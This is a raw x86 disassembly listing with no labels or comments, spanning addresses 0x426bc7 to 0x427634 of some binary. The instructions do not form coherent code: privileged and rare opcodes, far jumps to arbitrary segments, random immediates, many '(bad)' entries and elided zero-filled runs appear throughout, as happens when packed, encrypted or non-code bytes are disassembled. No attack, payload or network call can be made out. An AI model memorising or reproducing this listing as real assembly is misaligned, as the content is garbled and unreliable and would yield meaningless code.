  426bc7:	pop    ss
  426bc8:	jae    0x426c1d
  426bca:	int    0xd3
  426bcc:	mov    esi,0x10118e82
  426bd1:	mov    esi,0x94357109
  426bd6:	pop    esi
  426bd7:	dec    ecx
  426bd8:	call   0x91a4:0x261a0f17
  426bdf:	inc    ebx
  426be0:	inc    edi
  426be1:	push   ebx
  426be2:	getsec 
  426be4:	icebp  
  426be5:	data16 test al,0xa4
  426be8:	gs in  eax,0x44
  426beb:	rcl    BYTE PTR [eax],1
  426bed:	or     DWORD PTR [ebx],ebx
  426bef:	aas    
  426bf0:	mov    ch,0xee
  426bf2:	inc    edi
  426bf3:	and    edx,DWORD PTR [eax+0x12]
  426bf6:	mov    ds:0x941a3478,eax
  426bfb:	and    al,0xdc
  426bfd:	call   0x6a21:0x29e2ce9d
  426c04:	mov    ch,BYTE PTR [esi]
  426c06:	(bad)  
  426c07:	fdivr  st,st(2)
  426c09:	inc    ecx
  426c0a:	sub    edx,DWORD PTR [ebx-0xb]
  426c0d:	mov    ebx,0xb13203
	...
  426c72:	add    BYTE PTR [eax],al
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xd2da60b1
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0x65000001
  426c8d:	cmp    dl,dh
  426c8f:	mov    esi,0xc9ac9fb3
  426c94:	lahf   
  426c95:	int3   
  426c96:	mov    dh,0xc
  426c98:	mov    DWORD PTR [ecx],esp
  426c9a:	adc    BYTE PTR [edi],0x3d
  426c9d:	fcmovu st,st(4)
  426c9f:	mov    al,0x82
  426ca1:	arpl   di,di
  426ca3:	and    BYTE PTR [ebx],bh
  426ca5:	jg     0x426c32
  426ca7:	jae    0x426d19
  426ca9:	test   esp,0x8b919452
  426caf:	dec    edx
  426cb0:	lea    edi,[esi-0x3490ce0d]
  426cb6:	aam    0xb2
  426cb8:	fsub   DWORD PTR [ecx]
  426cba:	mov    fs,WORD PTR [edx]
  426cbc:	xchg   esp,eax
  426cbd:	sbb    al,0xf0
  426cbf:	fsubr  QWORD PTR ds:0xb368638a
  426cc5:	xchg   edx,eax
  426cc6:	jg     0x426d32
  426cc8:	addr16 sub eax,0x623df211
  426cce:	xor    ah,bl
  426cd0:	push   esp
  426cd1:	stos   BYTE PTR es:[edi],al
  426cd2:	cli    
  426cd3:	xchg   edx,eax
  426cd4:	sahf   
  426cd5:	xchg   edx,eax
  426cd6:	xor    DWORD PTR [eax-0x42964d29],ebp
  426cdc:	mov    esp,0x67f8f1ad
  426ce1:	hlt    
  426ce2:	jb     0x426d0f
  426ce4:	add    BYTE PTR [edi+0x69],0xe8
  426ce8:	push   esi
  426ce9:	mov    ch,ah
  426ceb:	push   ecx
  426cec:	shl    ebp,0xc5
  426cef:	out    dx,eax
  426cf0:	mov    al,0xfd
  426cf2:	in     eax,0x91
  426cf4:	ins    DWORD PTR es:[edi],dx
  426cf5:	test   DWORD PTR [edx+0x5e],esp
  426cf8:	daa    
  426cf9:	jmp    FWORD PTR [ecx]
  426cfb:	lods   eax,DWORD PTR ds:[esi]
  426cfc:	out    dx,eax
  426cfd:	xchg   edi,eax
  426cfe:	adc    eax,0x3ac07034
  426d03:	push   ebp
  426d04:	cld    
  426d05:	xor    bl,dl
  426d07:	icebp  
  426d08:	xchg   edx,eax
  426d09:	mov    dh,0xab
  426d0b:	xor    DWORD PTR [edi-0x5f],ebp
  426d0e:	aam    0x78
  426d10:	jmp    0xa9545b74
  426d15:	push   es
  426d16:	inc    ebp
  426d17:	or     ebx,0x41
  426d1a:	repnz dec ebp
  426d1c:	xor    al,0x19
  426d1e:	inc    ebx
  426d1f:	rcr    DWORD PTR [eax+0x3c],0xdf
  426d23:	or     dh,0x69
  426d26:	icebp  
  426d27:	push   edx
  426d28:	(bad)  
  426d29:	aad    0x5f
  426d2b:	lahf   
  426d2c:	mov    ebp,0x59f58a2b
  426d31:	pop    eax
  426d32:	icebp  
  426d33:	cld    
  426d34:	inc    eax
  426d35:	inc    ecx
  426d36:	mov    fs,WORD PTR [esi+0x75]
  426d39:	adc    eax,0x8d5ef364
  426d3e:	cmp    BYTE PTR [eax],dh
  426d40:	jecxz  0x426dc1
  426d42:	scas   al,BYTE PTR es:[edi]
  426d43:	mov    dh,BYTE PTR [edx+0x136a758a]
  426d49:	inc    eax
  426d4a:	sbb    BYTE PTR ds:0xfca597e6,al
  426d50:	inc    esp
  426d51:	mov    ch,0x8c
  426d53:	daa    
  426d54:	hlt    
  426d55:	or     BYTE PTR [eax-0xf],ch
  426d58:	inc    edx
  426d59:	retf   0x2ed2
  426d5c:	mov    ebp,0x11ec6c94
  426d61:	mov    cl,0x46
  426d63:	pop    eax
  426d64:	sbb    DWORD PTR [edi],ebx
  426d66:	jge    0x426d55
  426d68:	add    esi,DWORD PTR [esi+0x6f]
  426d6b:	shr    BYTE PTR [ecx],0x7a
  426d6e:	sub    al,cl
  426d70:	dec    ebp
  426d71:	xor    cl,BYTE PTR [edi-0x5b84b012]
  426d77:	and    ch,dh
  426d79:	shl    DWORD PTR [eax],1
  426d7b:	scas   al,BYTE PTR es:[edi]
  426d7c:	push   0x25778632
  426d81:	sub    al,0xba
  426d83:	fmul   QWORD PTR [eax]
  426d85:	mov    ds:0xcd8bbdfa,eax
  426d8a:	jae    0x426df1
  426d8c:	jg     0x426d7a
  426d8e:	push   0xffffffab
  426d90:	jp     0x426d92
	...
  426df2:	add    BYTE PTR [eax],al
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0x970c:0xc7c2ecf9
  426e01:	clc    
  426e02:	mov    al,0x8b
  426e04:	into   
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    eax,0x95000001
  426e0d:	mov    eax,ds:0xb52ccb7d
  426e12:	das    
  426e13:	loop   0x426dea
  426e15:	lahf   
  426e16:	call   0xd110:0x822c0baf
  426e1d:	push   DWORD PTR [eax-0x521dc503]
  426e23:	xor    ebp,DWORD PTR [edi+0x504c191d]
  426e29:	loopne 0x426dc6
  426e2b:	xlat   BYTE PTR ds:[ebx]
  426e2c:	jnp    0x426e96
  426e2e:	xchg   edx,eax
  426e2f:	inc    esi
  426e30:	cmp    BYTE PTR [ebp+0x6],ah
  426e33:	pop    ebp
  426e34:	cmc    
  426e35:	stos   DWORD PTR es:[edi],eax
  426e36:	fs scas al,BYTE PTR es:[edi]
  426e38:	sub    edi,DWORD PTR [ebp-0x49]
  426e3b:	add    al,0x31
  426e3d:	fs push es
  426e3f:	fistp  DWORD PTR [esi-0x57c921d3]
  426e45:	push   ebp
  426e46:	cmp    edx,DWORD PTR [ebp+0x37c5dfc0]
  426e4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e4d:	jg     0x426e72
  426e4f:	push   0x6e
  426e51:	stc    
  426e52:	add    dl,BYTE PTR [eax]
  426e54:	jle    0x426dde
  426e56:	jle    0x426ebf
  426e58:	push   ecx
  426e59:	(bad)  
  426e5a:	xchg   ebx,eax
  426e5b:	push   cs
  426e5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e5d:	mov    edx,0x44bcaa31
  426e62:	inc    eax
  426e63:	popa   
  426e64:	mov    dh,0xc8
  426e66:	sbb    DWORD PTR [esi+0x60a39f78],ebp
  426e6c:	repz aaa 
  426e6e:	dec    ecx
  426e6f:	or     dl,ch
  426e71:	fnstenv [edx]
  426e73:	jns    0x426ee1
  426e75:	shl    BYTE PTR [ecx+0x62],1
  426e78:	pop    edx
  426e79:	push   ds
  426e7a:	(bad)  
  426e7b:	sub    al,0xd6
  426e7d:	imul   si,dx,0x83da
  426e82:	clc    
  426e83:	pop    esi
  426e84:	or     bl,bl
  426e86:	dec    ebp
  426e87:	and    eax,0x88c5235b
  426e8c:	gs jle 0x426e13
  426e8f:	cmp    ch,BYTE PTR [esi+ebp*2-0xe17561e]
  426e96:	mov    BYTE PTR [ebp+0x236a047c],al
  426e9c:	mov    DWORD PTR [edx-0x6b],edx
  426e9f:	dec    eax
  426ea0:	mov    ds:0x5e0d58da,al
  426ea5:	mov    ah,0xb8
  426ea7:	dec    eax
  426ea8:	arpl   WORD PTR [esi],sp
  426eaa:	(bad)  
  426eab:	ss pop ss
  426ead:	push   cs
  426eae:	enter  0x6dd4,0xf8
  426eb2:	arpl   WORD PTR [ebp+0x70],dx
  426eb5:	mov    ds:0x89b11c20,eax
  426eba:	jno    0x426e67
  426ebc:	sti    
  426ebd:	jmp    0xb79a:0xeee8f8f1
  426ec4:	and    al,0xe5
  426ec6:	cld    
  426ec7:	int    0x80
  426ec9:	retf   0x8c49
  426ecc:	sub    ebx,ebp
  426ece:	add    DWORD PTR [eax-0x3c],eax
  426ed1:	xchg   esi,eax
  426ed2:	loopne 0x426ee4
  426ed4:	retf   
  426ed5:	jno    0x426e9a
  426ed7:	inc    eax
  426ed8:	pop    eax
  426ed9:	xchg   cx,ax
  426edb:	sbb    al,ah
  426edd:	fst    DWORD PTR [ebp-0x2b]
  426ee0:	add    al,0x3b
  426ee2:	add    eax,0xc6841c0c
  426ee7:	or     ebp,ecx
  426ee9:	sub    esi,ebx
  426eeb:	popa   
  426eec:	pop    ebp
  426eed:	and    esp,esi
  426eef:	bound  ebx,QWORD PTR [edx]
  426ef1:	adc    DWORD PTR [ebp-0x3f],ebp
  426ef4:	outs   dx,BYTE PTR ds:[esi]
  426ef5:	lds    edi,FWORD PTR [ecx+esi*8]
  426ef8:	adc    al,0x22
  426efa:	inc    edx
  426efb:	sub    DWORD PTR [eax-0x1c],eax
  426efe:	and    eax,0x283ad5f5
  426f03:	test   BYTE PTR [edi+edi*2],bh
  426f06:	sti    
  426f07:	test   al,0x6
  426f09:	cmp    bh,BYTE PTR [eax]
  426f0b:	add    DWORD PTR [ecx],eax
  426f0d:	leave  
  426f0e:	mov    ecx,0x366a
	...
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [edi+esi*2-0x2c435e04],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	leave  
  426f8d:	mov    ds:0x5b3ecb20,al
  426f92:	mov    DWORD PTR [edi-0xd324f3e],0x3f1cb4c3
  426f9c:	xchg   BYTE PTR ds:0xc43ef581,ch
  426fa2:	retf   0xc08f
  426fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fa6:	push   cs
  426fa7:	pop    ds
  426fa8:	push   ebx
  426fa9:	mov    ecx,0x230de23e
  426fae:	sbb    BYTE PTR [edx],bh
  426fb0:	xor    bh,BYTE PTR [ebx-0x23]
  426fb3:	pop    esp
  426fb4:	dec    edx
  426fb5:	pop    ebx
  426fb6:	xchg   esi,eax
  426fb7:	dec    esp
  426fb8:	daa    
  426fb9:	ins    BYTE PTR es:[edi],dx
  426fba:	mov    ebx,0xe90e7259
  426fbf:	jno    0x426fb3
  426fc1:	sbb    DWORD PTR [ecx],eax
  426fc3:	pop    esp
  426fc4:	fistp  WORD PTR [ebx-0x204ce4de]
  426fca:	gs xchg esp,eax
  426fcc:	jmp    0xe370:0x1ab5d215
  426fd3:	jmp    0xde9b6ea5
  426fd8:	enter  0x8c31,0x2d
  426fdc:	ror    BYTE PTR [esi-0x9052e95],1
  426fe2:	xor    DWORD PTR [esi+0x75],0x50
  426fe6:	xchg   edi,eax
  426fe7:	ret    0xb0e2
  426fea:	sar    DWORD PTR [ecx+0x24],cl
  426fed:	not    BYTE PTR [ecx+0x2a94d710]
  426ff3:	xor    DWORD PTR [ecx-0x7a1f9410],esp
  426ff9:	outs   dx,DWORD PTR ds:[esi]
  426ffa:	out    0xc8,eax
  426ffc:	pop    esp
  426ffd:	mov    ah,0x2e
  426fff:	and    DWORD PTR [ecx-0x5f],ecx
  427002:	(bad)  
  427003:	fist   DWORD PTR [ebp-0x3829f1e4]
  427009:	(bad)  
  42700a:	es inc ebp
  42700c:	leave  
  42700d:	sub    BYTE PTR [ecx+ebx*2-0x36],0xfb
  427012:	shr    DWORD PTR [edx-0x6f76e3c5],cl
  427018:	xchg   edi,eax
  427019:	sbb    BYTE PTR [edx-0x4b8e9bb5],bh
  42701f:	sub    eax,0x1ce83442
  427024:	aad    0x88
  427026:	iret   
  427027:	adc    DWORD PTR [esi-0x32],0x48
  42702b:	mov    eax,DWORD PTR [esi+0x1a]
  42702e:	out    0xe9,al
  427030:	jb     0x426fc8
  427032:	mov    WORD PTR [ebx+0x6550851],cs
  427038:	adc    BYTE PTR [edi],bh
  42703a:	mov    eax,ds:0xd6580cbc
  42703f:	into   
  427040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427041:	jmp    0x426fc4
  427043:	dec    eax
  427044:	sub    DWORD PTR ss:[edx],edi
  427047:	adc    al,0x2f
  427049:	mov    ch,0x28
  42704b:	(bad)  
  42704c:	mul    DWORD PTR [eax-0x5a9d36a0]
  427052:	or     eax,DWORD PTR [ebp-0x71caa0c1]
  427058:	pop    ss
  427059:	mov    al,0x43
  42705b:	sbb    DWORD PTR [esi+0x73c95bb4],edx
  427061:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427062:	push   ebp
  427063:	shl    BYTE PTR [edx+0x4ee61ddd],1
  427069:	lods   al,BYTE PTR ds:[esi]
  42706a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42706b:	mov    esi,0x4c5fff56
  427070:	jge    0x4270eb
  427072:	data16 (bad) 
  427074:	inc    edx
  427075:	clc    
  427076:	xchg   ecx,eax
  427077:	mov    ebp,0x1af14d0f
  42707c:	dec    ebp
  42707d:	ror    BYTE PTR [edi-0x19],cl
  427080:	xchg   edi,eax
  427081:	cmc    
  427082:	inc    ebx
  427083:	cmp    DWORD PTR [ecx],ecx
  427085:	mov    bl,0xce
  427087:	xchg   ebx,eax
  427088:	and    DWORD PTR [eax],edx
  42708a:	jecxz  0x427052
  42708c:	sti    
  42708d:	jge    0x427108
  42708f:	add    DWORD PTR [edx+0x0],edx
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x1ce69d96
  427102:	xchg   ebx,eax
  427103:	xchg   eax,ebx
  427105:	mov    eax,ds:0x1050001
  42710a:	add    BYTE PTR [eax],al
  42710c:	jp     0x4270f3
  42710e:	fst    QWORD PTR [ebx]
  427110:	daa    
  427111:	icebp  
  427112:	or     ch,BYTE PTR ds:0xd58b0826
  427118:	xor    al,0x4f
  42711a:	mov    al,0xef
  42711c:	sar    BYTE PTR [ecx-0x5f],0xe6
  427120:	imul   ebx,DWORD PTR [esi],0xbe8d5ced
  427126:	pop    esi
  427127:	push   ebp
  427128:	shl    DWORD PTR [ebp+0x14232ae9],cl
  42712e:	or     dh,dh
  427130:	int3   
  427131:	cmp    BYTE PTR [esi-0x5e1263b8],0x5a
  427138:	mov    ebp,0xe119ca2e
  42713d:	and    BYTE PTR [edx+0x4487941b],ch
  427143:	jecxz  0x42717b
  427145:	test   BYTE PTR [ecx-0xadf535f],dl
  42714b:	mov    ebp,0x6cb144b4
  427150:	out    0x20,al
  427152:	iret   
  427153:	adc    al,0x41
  427155:	outs   dx,BYTE PTR ds:[esi]
  427156:	add    eax,0xd294b82
  42715b:	cs repnz mov edi,0x936dae8e
  427162:	jmp    0x6521:0x912638f
  427169:	cmp    eax,0xffe12630
  42716e:	out    0xd3,eax
  427170:	and    ebp,edx
  427172:	jp     0x42717a
  427174:	in     eax,0x5a
  427176:	xor    al,0xab
  427178:	sbb    DWORD PTR [eax+eiz*4-0x6ef9339b],ecx
  42717f:	stc    
  427180:	and    esi,DWORD PTR [edi-0x34901c12]
  427186:	in     al,0x87
  427188:	xchg   edx,eax
  427189:	lahf   
  42718a:	mov    dl,0x49
  42718c:	jae    0x427147
  42718e:	scas   al,BYTE PTR es:[edi]
  42718f:	ret    0x50ef
  427192:	inc    ebx
  427193:	and    ecx,DWORD PTR [ecx-0x66]
  427196:	lahf   
  427197:	lock mov ebx,0x9f142b8e
  42719d:	cmp    al,0x4d
  42719f:	sbb    al,0x95
  4271a1:	xor    bl,BYTE PTR [ebp-0x1686397f]
  4271a7:	pop    edi
  4271a8:	ins    DWORD PTR es:[edi],dx
  4271a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4271aa:	and    edi,DWORD PTR [edx-0x13]
  4271ad:	rcl    BYTE PTR [esi-0x2576854b],cl
  4271b3:	iret   
  4271b4:	sbb    al,ah
  4271b6:	div    DWORD PTR [eax+0x759ea008]
  4271bc:	sub    al,0xc8
  4271be:	mov    eax,ds:0x56275b02
  4271c3:	pop    ecx
  4271c4:	leave  
  4271c5:	add    DWORD PTR [ebx],edx
  4271c7:	and    eax,0x8b0067e3
  4271cc:	sub    al,0x5
  4271ce:	sub    al,0xc4
  4271d0:	js     0x4271aa
  4271d2:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4271d4:	dec    eax
  4271d5:	mov    cl,0xf3
  4271d7:	loop   0x427224
  4271d9:	mov    bl,BYTE PTR [edi-0x33]
  4271dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271dd:	or     BYTE PTR [eax],bl
  4271df:	lods   eax,DWORD PTR ds:[esi]
  4271e0:	sub    BYTE PTR [eax-0x43e05236],ah
  4271e6:	xchg   DWORD PTR [ecx],esp
  4271e8:	retf   0x4be6
  4271eb:	mov    eax,0x7299faee
  4271f0:	or     BYTE PTR [ecx-0x3b62c35c],dh
  4271f6:	sub    al,0x25
  4271f8:	lods   al,BYTE PTR ss:[esi]
  4271fa:	dec    esi
  4271fb:	inc    edx
  4271fc:	ror    BYTE PTR ds:0xd84cdab9,0xd7
  427203:	pop    edi
  427204:	mov    ah,0x91
  427206:	fnsave [edx]
  427208:	and    ebx,DWORD PTR [ebx+edx*8-0x72]
  42720c:	leave  
  42720d:	push   es
  42720e:	mov    ebp,0xe4d0
	...
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0xa36f978a,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	out    dx,al
  42728d:	(bad)  
  42728e:	jnp    0x42721c
  427290:	jl     0x4272a0
  427292:	mov    ebx,0x478c6162
  427297:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427298:	pop    ss
  427299:	xchg   DWORD PTR [edx],ebp
  42729b:	sub    ebp,DWORD PTR [eax+eax*4]
  42729e:	mov    dl,0xd6
  4272a0:	jnp    0x42725a
  4272a2:	out    0xd2,al
  4272a4:	cmp    dl,BYTE PTR [ebx+0x4e884715]
  4272aa:	push   0xcca05e86
  4272af:	pop    ebp
  4272b0:	sbb    ebx,0xffffffcb
  4272b3:	mov    BYTE PTR [edi],dh
  4272b5:	lea    edx,[ebx-0x66]
  4272b8:	popa   
  4272b9:	ins    BYTE PTR es:[edi],dx
  4272ba:	popf   
  4272bb:	pushf  
  4272bc:	push   ss
  4272bd:	and    BYTE PTR [esi+0x13eb5a35],bl
  4272c3:	sub    al,0xd0
  4272c5:	inc    ebp
  4272c6:	pop    ebp
  4272c7:	dec    esp
  4272c8:	(bad)
  4272cb:	pop    es
  4272cc:	xchg   ebp,eax
  4272cd:	out    0x67,eax
  4272cf:	stos   DWORD PTR es:[edi],eax
  4272d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272d1:	xor    BYTE PTR [ecx],dl
  4272d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4272d4:	test   DWORD PTR [esi],edi
  4272d6:	xlat   BYTE PTR ds:[ebx]
  4272d7:	inc    eax
  4272d8:	jp     0x427285
  4272da:	and    DWORD PTR [eax+eax*1-0x57],ecx
  4272de:	or     DWORD PTR [ecx],0x4e
  4272e1:	add    DWORD PTR [ecx+eax*1+0x70],esi
  4272e5:	push   ebp
  4272e6:	sub    eax,0x4454a3d3
  4272eb:	int3   
  4272ec:	and    DWORD PTR ds:[edx-0x1a4713b5],ebp
  4272f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4272f4:	mov    al,0x1
  4272f6:	sub    al,0x8a
  4272f8:	sbb    dh,BYTE PTR [ecx+0x43791052]
  4272fe:	and    eax,0x6bd7919d
  427303:	push   0xfc3fd31f
  427308:	rcr    edi,1
  42730a:	jge    0x4272ef
  42730c:	mov    ah,cl
  42730e:	dec    edi
  42730f:	ret    
  427310:	loopne 0x42731f
  427312:	inc    edi
  427313:	xchg   edi,eax
  427314:	pop    esp
  427315:	jmp    0x2061d1dd
  42731a:	mov    al,ds:0xb098e89b
  42731f:	jne    0x427307
  427321:	pop    ebp
  427322:	and    ecx,DWORD PTR [ecx+0x106c68]
  427328:	pop    ecx
  427329:	add    ebp,DWORD PTR [ecx]
  42732b:	enter  0xdcb,0xf7
  42732f:	enter  0x9006,0x9d
  427333:	sub    eax,0x1299dd26
  427338:	daa    
  427339:	dec    edx
  42733a:	xor    esi,DWORD PTR [edi*8-0x772cbf5e]
  427341:	rcl    BYTE PTR [ebx+esi*2-0x7b],cl
  427345:	push   edi
  427346:	stos   BYTE PTR es:[edi],al
  427347:	(bad)  
  427348:	jle    0x42730c
  42734a:	inc    edx
  42734b:	ret    
  42734c:	mov    al,ds:0x21d38600
  427351:	mov    esi,0x4fa64eb4
  427356:	dec    ebp
  427357:	or     edi,edi
  427359:	dec    DWORD PTR [esi-0x3d]
  42735c:	fucomp st(3)
  42735e:	mov    al,ds:0x2f33404f
  427363:	dec    ebx
  427364:	scas   al,BYTE PTR es:[edi]
  427365:	push   esi
  427366:	call   0x5f9a57a3
  42736b:	cld    
  42736c:	loopne 0x4272fb
  42736e:	ret    
  42736f:	cmp    DWORD PTR [ebx-0x59913761],esp
  427375:	or     bl,BYTE PTR [eax]
  427377:	add    dh,BYTE PTR [edx-0x5a]
  42737a:	jnp    0x42732b
  42737c:	jne    0x427346
  42737e:	pop    ebx
  42737f:	jo     0x42738c
  427381:	imul   DWORD PTR es:[ebp-0x80]
  427385:	mov    al,ds:0xa2a652b1
  42738a:	rcl    DWORD PTR [edx],cl
  42738c:	daa    
  42738d:	ror    bh,1
  42738f:	push   es
  427390:	jae    0x427392
	...
  4273f2:	add    BYTE PTR [eax],al
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebp,DWORD PTR [edx]
  427401:	(bad)  
  427402:	cli    
  427403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427404:	loop   0x4273a9
  427406:	add    DWORD PTR [eax],eax
  427408:	add    eax,0x60000001
  42740d:	imul   ebp,edi,0x1a
  427410:	mov    al,0x78
  427412:	mov    ch,0xa7
  427414:	xchg   DWORD PTR [ecx-0xa0d24be],edi
  42741a:	fistp  WORD PTR [ecx+0xa]
  42741d:	sbb    esp,DWORD PTR [ebx]
  42741f:	adc    al,0xaa
  427421:	and    eax,0x2ace9e84
  427426:	inc    esp
  427427:	arpl   WORD PTR [edi],sp
  427429:	fcomp  QWORD PTR [esp-0x1e]
  42742d:	mov    bl,0xc1
  42742f:	popa   
  427430:	cmp    BYTE PTR ds:0x7e8cd7d1,ah
  427436:	lds    ebp,FWORD PTR [edi+0x33ac3e2c]
  42743c:	call   DWORD PTR [ebx]
  42743e:	xor    DWORD PTR [esi-0x3a],ecx
  427441:	jbe    0x427478
  427443:	and    al,0xaa
  427445:	dec    esi
  427446:	test   al,0x4b
  427448:	sbb    bl,BYTE PTR [edx]
  42744a:	clc    
  42744b:	push   ds
  42744c:	xchg   BYTE PTR ds:0xf40f0f9,bl
  427452:	bound  ecx,QWORD PTR [esi]
  427454:	lahf   
  427455:	test   eax,0x602e3c9e
  42745a:	or     edx,DWORD PTR [esi-0x6f4a7b1f]
  427460:	(bad)  
  427461:	jbe    0x4274a7
  427463:	cs xor eax,0xa60fb959
  427469:	outs   dx,BYTE PTR ds:[esi]
  42746a:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  42746c:	xchg   edx,eax
  42746d:	scas   eax,DWORD PTR es:[edi]
  42746e:	sub    eax,0x7e8db5c6
  427473:	fwait
  427474:	bswap  esi
  427476:	imul   esp,DWORD PTR [ebx+0x74cc4174],0xe770a0ee
  427480:	sbb    ecx,esp
  427482:	mov    esi,0x47cacd1c
  427487:	fimul  WORD PTR [edx-0x43ed6d60]
  42748d:	or     esp,ebp
  42748f:	repz cmpxchg DWORD PTR [edx+0x70a74451],esp
  427497:	mov    dh,0xb0
  427499:	dec    esi
  42749a:	and    dh,bh
  42749c:	lods   al,BYTE PTR ds:[esi]
  42749d:	jle    0x42745c
  42749f:	bound  edx,QWORD PTR [ebx+0x7e2780a]
  4274a5:	aas    
  4274a6:	xor    DWORD PTR [edx+0x135a3ff4],edi
  4274ac:	aas    
  4274ad:	std    
  4274ae:	lds    ecx,FWORD PTR [ebx]
  4274b0:	adc    eax,0x48c3ccb0
  4274b5:	push   es
  4274b6:	sbb    ecx,DWORD PTR [edx+eax*8+0xe]
  4274ba:	xor    al,0x26
  4274bc:	das    
  4274bd:	out    dx,al
  4274be:	fcmovnu st,st(3)
  4274c0:	and    edi,DWORD PTR [esi+0x13]
  4274c3:	leave  
  4274c4:	cld    
  4274c5:	cmp    eax,0xa6becdcb
  4274ca:	adc    al,0x36
  4274cc:	ror    BYTE PTR [esi+0x39],1
  4274cf:	jne    0x427456
  4274d1:	cmp    al,0x28
  4274d3:	sub    al,0xfe
  4274d5:	pop    es
  4274d6:	inc    esp
  4274d7:	jns    0x4274da
  4274d9:	inc    ecx
  4274da:	sbb    al,BYTE PTR [ebx-0x50357cc0]
  4274e0:	rcr    BYTE PTR [edx],cl
  4274e2:	(bad)  
  4274e3:	mov    ch,0xfa
  4274e5:	cmp    BYTE PTR [eax],bh
  4274e7:	mov    fs,WORD PTR [ebx+0x4e]
  4274ea:	sbb    BYTE PTR [esp+ecx*8-0x48e48af2],ah
  4274f1:	jno    0x427479
  4274f3:	xor    ebp,DWORD PTR [esi-0x43]
  4274f6:	mov    bl,0xec
  4274f8:	mov    esi,0x27d5bcd
  4274fd:	int    0x4b
  4274ff:	test   DWORD PTR ds:0x915a48d7,edi
  427505:	dec    ebp
  427506:	sub    BYTE PTR [ebp-0x4c],dh
  427509:	test   al,0x14
  42750b:	xchg   DWORD PTR [esp+ebp*2+0x50a2fb],edx
	...
  427572:	add    BYTE PTR [eax],al
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	inc    edi
  427581:	xlat   BYTE PTR ds:[ebx]
  427582:	lea    edx,[eax+0x1a4e7]
  427588:	add    eax,0xcb000001
  42758d:	loopne 0x42759a
  42758f:	neg    BYTE PTR [eax+esi*4]
  427592:	daa    
  427593:	int    0x43
  427595:	sbb    eax,0x7ba2c552
  42759a:	test   eax,0x66481757
  42759f:	or     eax,0x62a6d054
  4275a4:	es clc 
  4275a6:	or     eax,DWORD PTR [ecx-0x12644804]
  4275ac:	ins    BYTE PTR es:[edi],dx
  4275ad:	shl    BYTE PTR [ebx+ecx*4-0x31],1
  4275b1:	cmp    DWORD PTR [ecx+0x59376a25],eax
  4275b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275b8:	pusha  
  4275b9:	add    dl,bl
  4275bb:	push   esp
  4275bc:	sub    al,0x63
  4275be:	pop    ss
  4275bf:	out    0x51,eax
  4275c1:	mov    ds:0x3496882f,eax
  4275c6:	sub    esp,0x22
  4275c9:	call   0x334e:0x7dfe0f65
  4275d0:	pop    ss
  4275d1:	ror    ah,0x89
  4275d4:	fs loopne 0x42761e
  4275d7:	and    eax,0xc7462976
  4275dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275dd:	xchg   ecx,eax
  4275de:	js     0x427657
  4275e0:	fs inc esp
  4275e2:	adc    al,0xdc
  4275e4:	xlat   BYTE PTR ds:[ebx]
  4275e5:	imul   edx,ebx,0xffffffe3
  4275e8:	xchg   edx,eax
  4275e9:	or     al,0x20
  4275eb:	mov    esp,0x39dd0dac
  4275f0:	push   esi
  4275f1:	imul   esi,edi,0x2
  4275f4:	pushf  
  4275f5:	(bad)  
  4275f6:	cs pop ds
  4275f8:	and    esp,DWORD PTR [ecx]
  4275fa:	mov    edi,0x4cc659cc
  4275ff:	push   edi
  427600:	fisubr WORD PTR [ebx+eax*2+0x333933b7]
  427607:	arpl   WORD PTR [ebx+0x32],si
  42760a:	enter  0xcbc5,0xb5
  42760e:	xchg   DWORD PTR [ebx-0x2f63f79],edi
  427614:	je     0x427664
  427616:	popf   
  427617:	pop    ebp
  427618:	mov    ds:0x40805e4b,al
  42761d:	mov    edi,0xc4711a30
  427622:	pop    esi
  427623:	test   ah,ch
  427625:	pop    es
  427626:	in     al,dx
  427627:	pop    esp
  427628:	xor    bh,BYTE PTR [ebx+ebp*4]
  42762b:	cmp    ebp,DWORD PTR [edx-0x72]
  42762e:	xor    ebx,DWORD PTR [ebp+0xd67c5dd]
  427634:	mov    esi,0x65b2c96a
